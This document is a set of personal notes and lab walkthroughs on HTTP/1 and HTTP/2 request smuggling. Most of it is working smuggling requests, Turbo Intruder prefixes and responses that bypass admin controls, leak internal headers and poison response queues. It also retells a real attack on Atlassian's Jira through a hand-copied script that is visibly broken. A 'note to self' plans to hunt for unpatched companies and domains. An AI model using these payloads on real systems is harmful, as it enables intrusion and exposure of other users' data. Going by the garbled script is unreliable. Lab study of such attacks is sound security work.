# HTTP Request Smuggling / Desync Attacks: HTTP/1 &  HTTP/2
[My YouTube Channel with a Request Smuggling playlist and more](https://www.youtube.com/@infosec5101)

[HackTricks on Request Smuggling](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/http-request-smuggling/README.md)

[HTTP Request Smuggling extension for BurpSuite](https://github.com/PortSwigger/http-request-smuggler)

[PortSwigger's labs for Advanced Request Smuggling](https://portswigger.net/web-security/request-smuggling/advanced)

*Note: As of the initial upload, this file needs more editing to look pretty. I'll be working on that, feel free to open a pull request with any changes. Having said that, examples from almost every lab are here..*
---
*This is a collection of notes and walktthroughs I have made over the past couple of years on this attack.*

In this doc:
- CL.TE
- TE.CL
- TE.TE
- Most attack simulations
- H/2 labs
- & more 
---

-   CL.TE: the front-end server uses the `Content-Length` header and the back-end server 
     uses the `Transfer-Encoding` header.
-   TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end 
     server uses the `Content-Length` header.
-   TE.TE: the front-end and back-end servers both support the `Transfer-Encoding`  
     header, but one of the servers can be induced not to process it by obfuscating the header in some way.

---

## CL.TE
Here, the **front-end** server uses the **`Content-Length`** header and the **back-end** server uses the **`Transfer-Encoding`** header. We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1  
Host: vulnerable-website.com  
Content-Length: 30  <- Used by the front end in CL.TE 
Connection: keep-alive  
Transfer-Encoding: chunked  
0
```
>  
```
GET /404 HTTP/1.1  
Foo: x
```
Note how `Content-Length` indicate the **bodies request length is 30 bytes long** (_remember that HTTP uses as new line, so 2bytes each new line_), so the reverse proxy **will send the complete request** to the back-end, and the back-end will process the `Transfer-Encoding` header leaving the `GET /404 HTTP/1.1` as the **begging of the next request** (AND, the next request will be appended to `Foo:x<Next request starts here>`).

>
  _**With H/1 , there is disagreement  between the Front End and the Back End
  server, on whether to use the Content-Length, or the Transfer -Encoding header, to know the length of the message.
>This is what makes it exploitable.
>
>This does not exist in H/2 because the length is built into the frame layer
>
---

## TE.CL
Here, the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. (That's why those two headers are in both requests) We can perform a simple HTTP request smuggling attack as follows:

>`POST / HTTP/1.1`  
>`Host: vulnerable-website.com`  
>`Content-Length: 4`  
>`Connection: keep-alive`  
>`Transfer-Encoding: chunked`   <- used by the front end in TE.CL 
>
>` 7b` <-- 4 bytes to be processed as specified by the `Content-Length` in the 1st request
>`GET /404 HTTP/1.1`
>`Host: vulnerable-website.com`
>`Content-Type: application/x-www-form-urlencoded`
>`Content-Length: 30`  
>`x=`  
>`0`  

In this case the **reverse-proxy** will **send the whole request** to the **back-end** as the **`Transfer-encoding`** indicates so. But, the **back-end** is going to **process** only the **`7b`** (4bytes) as indicated in the `Content-Lenght` .Therefore, the next request will be the one starting by `GET /404 HTTP/1.1`

---

## Demo: 
- Smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

- Using the Turbo Intruder TE.CL Attack, Multiple duplicate requests made, in this order:

POST / HTTP/1.1
Host: ac251f861ffc8725c06a343700b9003d.web-security-academy.net
Cookie: session=TmGWbnPLPMbUr4iwIZob57sBH4i2kuMK
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
tRANSFER-ENCODING: chunked

3
x=y
0

---
>`POST / HTTP/1.1
>`Host: ac251f861ffc8725c06a343700b9003d.web-security-academy.net
>`Cookie: session=TmGWbnPLPMbUr4iwIZob57sBH4i2kuMK
>`Connection: keep-alive
>`Content-Type: application/x-www-form-urlencoded
>`Content-length: 12
>`tRANSFER-ENCODING: chunked
>
>`3
>`x=y
>`5c
>`GPOST / HTTP/1.1
>`Content-Type: application/x-www-form-urlencoded
>`Content-Length: 15
>
>`x=1
>`0
POST / HTTP/1.1
Host: ac251f861ffc8725c06a343700b9003d.web-security-academy.net
Cookie: session=TmGWbnPLPMbUr4iwIZob57sBH4i2kuMK
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
tRANSFER-ENCODING: chunked

3
x=y
0

---
## Response: 

HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 27

"Unrecognized method GPOST"

---
## Turbo Intruder code:

>`import re
>
`def queueRequests(target, wordlists):
  `  engine = RequestEngine(endpoint=target.endpoint,
>`...`
>  
    # This will prefix the victim's request. Edit it to achieve the desired effect.
    `prefix = '''GPOST / HTTP/1.1
`Content-Type: application/x-www-form-urlencoded
`Content-Length: 15
>
`x=1'''
>

---

## TE.TE behavior: obfuscating the TE header

Here, the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:

>Transfer-Encoding: xchunked 
>
>Transfer-Encoding : chunked 
>
>Transfer-Encoding: chunked 
>Transfer-Encoding: x 
>
>Transfer-Encoding:[tab]chunked [space]
>
>Transfer-Encoding: chunked X: X[\n]
>
>Transfer-Encoding: chunked 
>
>Transfer-Encoding : chunked`
 `
_To uncover a TE.TE vulnerability, it is necessary to find some variation of the
`Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it

_Depending on whether it is the front-end or the back-end server that can be induced to NOT to process the obfuscated `Transfer-Encoding` header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities.

---

## Demo Obfuscating the Transfer Encoding header
This demo involves a front-end and back-end server. The two servers handle duplicate HTTP request headers in differently. 
The front-end server rejects requests that aren't using the GET or POST method.

##### Goal: smuggle a request to the back-end server, causing the next request processed by the back-end server appears to use the method `GPOST`.
_Turbo Intruder can be used again here too.
*Solving a TE.TE is very similar to a TE.CL*

## The Turbo Intruder payload set up:

>` # This will prefix the victim's request. Edit this accordingly.
         `prefix = '''
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
>
x=1'''
>
Removed the URL from the smuggled request. 
These attacks are virtually automated

---

A series of these requests in this order successfully smuggled in a 2nd request labled GPOST

##### REQUESTS:

---

POST / HTTP/1.1
Host: ac631f891e4c27dfc10543dc0035006d.web-security-academy.net
Cookie: session=v1XJsTUeCJ99lQv3ZLAObLuqPkDG5hzv
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked
Transfer-encoding: identity

3
x=y
0

---

>`POST / HTTP/1.1
>`Host: ac631f891e4c27dfc10543dc0035006d.web-security-academy.net
  `Cookie: session=v1XJsTUeCJ99lQv3ZLAObLuqPkDG5hzv
>`Content-Type: application/x-www-form-urlencoded
>`Content-length: 12
>`Transfer-Encoding: chunked
>`Transfer-encoding: identity
>`3
>`x=y
>`5e
>`GPOST / HTTP/1.1
>`Content-Type: application/x-www-form-urlencoded
>`Content-Length: 15
>`x=1
>`0
---

POST / HTTP/1.1
Host: ac631f891e4c27dfc10543dc0035006d.web-security-academy.net
Cookie: session=v1XJsTUeCJ99lQv3ZLAObLuqPkDG5hzv
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked
Transfer-encoding: identity

3
x=y
0

---


#####  RESPONSE:
"Unrecognized method GPOST"

---


#### Bypass front-end security controls 
##### CL.TE vulnerability

 _Turbo truder initial config

 >   # This will prefix the victim's request. Edit it to achieve the desired effect.
    `prefix = '''GET /admin HTTP/1.1
`X-Ignore: X'''
- 1st request

```
POST / HTTP/1.1
Host: acb01f791f358360c0f7901000650001.web-security-academy.net
Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
0
```

```
GET /admin HTTP/1.1
X-Ignore: X
```

---
- 2nd, 3rd, 4th & 5th
---

```
POST / HTTP/1.1
Host: acb01f791f358360c0f7901000650001.web-security-academy.net
Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
0
```


---
Response:

---

`
```
                   </header>
                    <header class="notification-header">
                    </header>
                    Admin interface only available to local users
                </div>
            </section>
```
`


-----
_Now turbo truder looked like this:

>    # This will prefix the victim's request. Edit it to achieve the desired effect.
`prefix = '''GET /admin HTTP/1.1
`Host: localhost
>
`x=x'''
>
---

And three successive requests did it:

1.

---

POST / HTTP/1.1
Host: acb01f791f358360c0f7901000650001.web-security-academy.net
Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked

3
x=y
0


2.

---

POST / HTTP/1.1
Host: acb01f791f358360c0f7901000650001.web-security-academy.net
Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked

3
x=y
0

`GET /admin HTTP/1.1
Host: localhost
x=x
---
3.
---
```
POST / HTTP/1.1
Host: acb01f791f358360c0f7901000650001.web-security-academy.net
Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
tRANSFER-ENCODING: chunked

3
x=y
0
```
---
Response:
```
                       <div>
                           <span>carlos - </span>
                           <a href="/admin/delete?`username=carlos">Delete</a>
                        </div>
                       <div>
```

 `                       
- Then, make this request twice,  and carlos was deleted:
```
POST / HTTP/1.1
Host: acb01f791f358360c0f7901000650001.web-security-academy.net
Cookie: session=eu4TfRuSOBg8KLcGj6LaQE6C3gVsh6Ec
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked

3
x=y
0
```
```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```
x=x
---
### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Here's a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.
Goal:
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.
#### This will prefix the victim's request. Edit it to achieve the desired effect.
```
<code in turbo intruder>


prefix = '''GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''
```
---
3 requests..
```
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked

3
x=y
0
```
---
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 12
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
5f
GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
---
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
0
---
#### the response:
`                   </header>
                    Admin interface only available to local users
                </div>`
                
---
so smuggle a GET request for admin on local host
GET /admin HTTP/1.1
Host: localhost
--
##### turbo truder now:
    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1'''
---
 
after a few reqs
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
0
---
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 12
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
70
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
---
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
0
---
Response:
`<a href="/admin/delete?username=carlos">Delete</a>`
---
##### And so I sent this one to repeater:
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 12
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
70
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
and added the line:
/delete?username=carlos
to /admin
GET /admin/delete?username=carlos
--
##### It's taking too long so send it to the turb truder
                           )
    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1'''
---
##### SOLVED:
these _requests_ deleted carlos:
---
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
0
---
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
0
---
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 12
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
89
`GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
---
POST / HTTP/1.1
Host: ac7e1fbc1e20b9b3c08c808e003b0009.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
tRANSFER-ENCODING: chunked
3
x=y
0
---
##### response:
HTTP/1.1 `302  Found
`Location: /admin
Set-Cookie: session=6IHZjFoYxFKCA4mgDwlampand0zgaVr8; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 0
---
#### Revealing front-end request rewriting
 If you can find which new values are appended to the request you could be able to bypass protections and access hidden information/endpoints.
For discovering how is the proxy rewriting the request you need to find a POST parameter that the back-end will reflect it's value on the response. Then, use this parameter the last one and use an exploit
There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:
1.   Find a POST request that reflects the value of a request parameter into the 
    application's response.
2.   Shuffle the parameters so that the reflected parameter appears last in the message 
     body.
3.   Smuggle this request to the back-end server, followed directly by a normal request 
     whose rewritten form you want to reveal.
##### For example:
Suppose an application has a login function that reflects the value of the `email` parameter:
>`POST /login HTTP/1.1 
>`Host: vulnerable-website.com 
>`Content-Type: application/x-www-form-urlencoded 
>`Content-Length: 28 
>`email=wiener@normal-user.net`
This results in a response containing the following:
>`<input id="email" value="wiener@normal-user.net" type="text">`
Here you can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server:
>
`POST / HTTP/1.1 
`Host: vulnerable-website.com 
`Content-Length: 130 
`Transfer-Encoding: chunked 
>
`0
>
`POST /login HTTP/1.1 
`Host: vulnerable-website.com 
`Content-Type: application/x-www-form-urlencoded 
`Content-Length: 100 
`email=POST /login HTTP/1.1 
`Host: vulnerable-website.com ...`
In many applications, the **front-end server performs some rewriting of requests** before they are forwarded to the back-end server, typically by adding some additional request headers.  
One common thing to do is to **add to the request the header** `X-Forwarded-For: <IP of the client>` or some similar header so the back-end knows the IP of the client.  
Sometimes, if you can **find which new values are appended** to the request you could be able to **bypass protections** and **access hidden information**/**endpoints**.
For discovering how is the proxy rewriting the request you need to **find a POST parameter that the back-end will reflect it's value** on the response. Then, use this parameter the last one and use an exploit like this one:
>
`POST / HTTP/1.1`  
`Host: vulnerable-website.com`  
`Content-Length: 130`  
`Connection: keep-alive`  
`Transfer-Encoding: chunked`
>
`0`
>
`POST /search HTTP/1.1`
`Host: vulnerable-website.com`
`Content-Type: application/x-www-form-urlencoded`
`Content-Length: 100`  
`search=`
In this case the next request will be appended after `search=` which is also **the parameter whose value is going to be reflected** on the response, therefore it's going to **reflect the headers of the next request**.
Note that **only the length indicated in the `Content-Length` header of the embedded request is going to be reflected**. If you use a low number, only a few bytes will be reflected, if you use a bigger number than the length of all the headers, then the embedded request will throw and error. Then, you should **start** with a **small number** and **increase** it until you see all you wanted to see.  
Note also that this **technique is also exploitable with a TE.CL** vulnerability but the request must end with `search=\r\n0\r`. However, independently of the new line characters the values are going to be appended to the search parameter.
Finally note that in this attack we are still attacking ourselves to learn how the front-end proxy is rewriting the request.
---
##### Demmo:
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
There's an admin panel at `/admin`, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name.
To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. 
Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user `carlos`.
---
##### First used repeater then sent to turbo:
1st
proxy a get request for the home page and send it to repeater
then proxy a search (post request) and send that to repeater
2nd
smuggle probe the GET / request
3rd
go to the smuggle probe result and send it to repeater, remove the non-essential headers and
send it once to test it out
4th
copy the smuggle probed POST request, and go to the repeater tab containing the search post request from earlier
and paste the smuggle probed POST above the search POST. leave only a zero separated by a space on both sides between the two post requests
5th
edit the two requests, make them look like this:
---
POST / HTTP/1.1
Host: ac0e1f141ec03abfc0b6a6ec002b006e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
tRANSFER-ENCODING: chunked
0
POST / HTTP/1.1
Content-Length: 200
Content-Type: application/x-www-form-urlencoded
Connection: close
search=PHONE
---
6th
make sure update content length is on in the repeater menue
send the dual post requests through a couple times
the goal is to reveal the hidden host header
if that isnt seen, then send the request to ..
right click on request window and select
Extensions -> HTTP Request Smuggler -> Smuggle Attack(CL.TE)
---
##### How it went & looked:
---
POST / HTTP/1.1
Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
tRANSFER-ENCODING: chunked
0
POST / HTTP/1.1
Content-Length: 200
Content-Type: application/x-www-form-urlencoded
Connection: close
search=PHONE
---
##### a few requests in turbo and secrete headers were revealed: localhost headers
---
POST / HTTP/1.1
Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 124
tRANSFER-ENCODING: chunked
5a
GET / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0
POST / HTTP/1.1
Content-Length: 200
Content-Type: application/x-www-form-urlencoded
Connection: close
search=PHONE
---
POST / HTTP/1.1
Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
tRANSFER-ENCODING: chunked
0
POST / HTTP/1.1
Content-Length: 200
Content-Type: application/x-www-form-urlencoded
Connection: close
search=PHONE
---
POST / HTTP/1.1
Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
tRANSFER-ENCODING: chunked
0
POST / HTTP/1.1
Content-Length: 200
Content-Type: application/x-www-form-urlencoded
Connection: close
search=PHONE
---
RESPONSE:
    </header>
    <header class="notification-header">
    </header>
    <section class=blog-header>
    <h1>0 search results for 'PHONEPOST / HTTP/1.1
X-lFuLwp-Ip: 173.94.163.116
Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
tRANSFE'</h1>
                        <hr>
                    </section>         
 _The Header I needed:
 #### X-lFuLwp-Ip:
then added it to the smuggled request with 127.0.0.1
sent this through repeater a few times
---
POST / HTTP/1.1
Host: acd11f5b1f0e833cc0e4960b00fe00b2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
tRANSFER-ENCODING: chunked
0
GET /admin/delete?username=carlos HTTP/1.1
`X-lFuLwp-Ip: 127.0.0.1
---
##### and BOOM!
- The response:
HTTP/1.1 `302 Found
`Location: /admin
Set-Cookie: session=PgQeEiCyOa6xkzzCFUi9W2hgIUhFiThZ; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 0
                    
                    
---
## Moving on to  HTTP/2 Desync Attacks
>
  _**With H/1 , there is disagreement  between the Front End and the Back End
  server, on whether to use the Content-Length, or the Transfer -Encoding header, to know the length of the message.
>This is what makes it exploitable.
>
>This dissagreement does not exist in H/2 , because the length is built into the frame layer.
>
##### Example 1
##### H2.CL Desync
---
- Classic request smuggling is a CL.TE or TE.CL issue.
- HTTP/2 downgrade smuggling is H2.CL or H2.TE
(some exceptions apply)
#### H2.TE via Request Header Injection
---
HTTP/2's binary design, combined with the way it compresses headers, enables you to put arbitrary characters in arbitrary places. The server is expected to re-impose HTTP/1-style restrictions with an extra validation step:
> Any request that contains a character not permitted in a header field value MUST be treated as malformed
Naturally, this validation step is skipped by many servers.
Atlassian's Jira looked like it had such vulnerability. I created a simple proof-of-concept intended to trigger two distinct responses:
- a normal one
- and the robots.txt file. 
However, the actual result was something else entirely:
(in Turbo Intruder)
**The original GET request:**
>GET /secure/ QuickSearch.jira HTTP/1.1
>Host: ecosystem.atlassian.net
>Foo: bar*~Host: ecosystem.atlassian.net^ `~`  ^ GET /robots.txt HTTP/1.1*~Foo: bar
>
Can use multiple new lines in the request to split the header
---
*Attenion reader: Warning,  the following Turbo Intruder request, original GET requests and responses were copied by hand, line for line from very small font from a video of James conducting this attack. Some headers , spelling and names, may be incorrect. )
**The exact Turbo Intruder script used against Atlasian by James Kettle**
> def  queueRequests(target, wordlists):
> 		engine = RequestEngine=(endpoint=https://ecosystem.atlassian.net :443,
> 													concurrentConnections=5,
> 													requestsPerConnection=10,
> 													engine=Engine.HTTP2,
> 													pipeline=False
> 													)
> 		attack = `'''GET /secure/QuiclSearch.jira HTTP/1.1
> `Host: ecosystem.atlassian.net
> `Foo: bar*~Host: ecosystem.atlassian.net^ `~`  ^ GET /robots.txt HTTP/1.1*~Foo: bar
>
>`'''
>		for i in range(5000):
>		engine.queue(target.req)
>
>def handleResponse(req, interesting):
>      table.add(req)
>
>
>
>
**The Python script above triggers two distinct responses **
- a normal one 
- and the robots.txt file. 
>**However, the actual result was something else entirely.**
---
The server started sending  responses intended for other Jira users, including a vast quantity of sensitive information and PII.
The root cause was a small optimization James made when crafting the payload. He decided that instead of using `\r\n` to smuggle a Transfer-Encoding header, it'd be better to use a `double-\r\n` to terminate the first request, enabling him to directly include his malicious prefix in the header:
**It was H2.X Request Splitting - Resp Que Poisining**
 **The GET Request :**
>GET /secure/ QuickSearch.jira HTTP/1.1
>Host: ecosystem.atlassian.net
>Foo: bar*~Host: ecosystem.atlassian.net^ `~`  ^ GET /robots.txt HTTP/1.1*~Foo: bar
>
 
 **The response after running Turbo Intruder agaiunst Atlassian**
ati-trace10:
x=arequestid: a()f1bb=9o7a-(b3&c=ada3c4f=eda3fe427)
x=accountid: (redacted for privacy)
x=xxx-protection: :/ mode=block
string=allow-origin: *
x-envoy=updates-service-time: 276
x-content: type-options: nosniff
expect-QT: report-url="https://web-security-reports.service.atlassian.com/expect-ct-report/global-proxy",  enforce, max-age*|(400
>
>
>
>(response body redacted for non-disclosure)
>
>
>
>
This approach avoided the need for chunked encoding, a message body, and the POST method. However, it failed to account for a crucial step in the HTTP downgrade process - the front-end must terminate the headers with \r\n\r\n sequence. This led to it terminating the prefix, turning it into a complete standalone request:
`GET / HTTP/1.1   Foo: bar   Host: ecosystem.atlassian.net      GET /robots.txt HTTP/1.1   X-Ignore: x   Host: ecosystem.atlassian.net\r\n   \r\n`
Instead of the back-end seeing 1.5 requests as usual, it saw exactly 2. I received the first response, but the next user received the response to my smuggled request. The response they should've received was then sent to the next user, and so on. In effect, the front-end started serving each user the response to the previous user's request, indefinitely.
**The cause of this was Atlassian using the post-secure virtual traffic manager products
- Pulse Secure (SA44790)
- netlify
- imperva WAF
>**!!! note to self: Discover some more post secure virtual manager traffic managers, (not the 3 above, as they have likely patched this vulnerability, and the companies and domains using them)**
**When all else fails, use request tunneling**
With blind req smuggline, if request response takes too long, switch the POST method, to HEAD
Leaking internal headers via tunneling using Param Miner
---
- **H2.CL request smuggling**
-  **Request splitting via CRLF injection**
- **Bypassing access controls via HTTP/2 request tunnelling**
---
**Lab H2.CL request smuggling**
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
To solve the lab, perform a request smuggling attack that causes the victim's browser to load a malicious JavaScript file from the exploit server and call `alert(document.cookie)`. The victim user accesses the home page every 10 seconds.
- Sent a search query POST req to repeater, and trimmed it down to just the essential headers.
- Then performed an H/2 Smuggle Probe
- Sent that result to repeater
- Then edited the req even more and sent this to see if I could get a 404 response, 
because that means I can make the back-end  append any subsequent requests to the smuggled prefix.
>POST / HTTP/2 
>Host: YOUR-LAB-ID.web-security-academy.net 
>Content-Length: 0 
>
>0
>
>NETFLIXSUX
- Then smuggled a GET req  to the /resources path, using a random domain name. The reason is to see if it /resources is appended to it and if I get a 302 found response..this means that I can craft an exploit and smuggle a get req that will direct an unsuspecting user to my exploit server using the /resources path
- And for some reason were using a CL of 0. But hey, it worked. 
>POST / HTTP/2
>Host: ac431fe71e99be12c0542b47009f0047.web-security-academy.net
>Content-Length: 0
>
>0
>
>GET /resources HTTP/1.1
>Host: lukesmith.xyz
>Content-Length: 5
>
>x=1
And thats what I did to solve it.
Went to the exploit server and loaded the payload `alert(document.cookie)`
stored it, and pasted it's URL to the smuggled GET req..so it looked like this:
>POST / HTTP/2
>Host: ac431fe71e99be12c0542b47009f0047.web-security-academy.net
>Content-Length: 0
>
>0
>
>GET /resources HTTP/1.1
>Host: `exploit-ac0a1f0b1ebebe27c07b2bfb010e00a1.web-security-academy.net
>Content-Length: 5
>
>x=1
and the result after mutiple rapid requests and itermittent waiting..
>HTTP/2 200 OK
>Content-Type: text/html; charset=utf-8
>Set-Cookie: session=7Kx2NAv5aXQNaYEcbo8iglPGV75qcLBV; Secure; HttpOnly; SameSite=None
>Content-Length: 10310
`       <div class=container>
            ``<h4>Congratulations, you solved the lab!</h4>
            ``<div>`
---
**HTTP/2 request splitting via CRLF injection**
(Should be simmilar to what James Kettle pulled on Atlassian
And remeber try out his python turbo intruder above)
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.
To solve the lab, delete the user `carlos` by using [response queue poisoning](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning) to break into the admin panel at `/admin`. An admin user will log in approximately every 10 seconds.
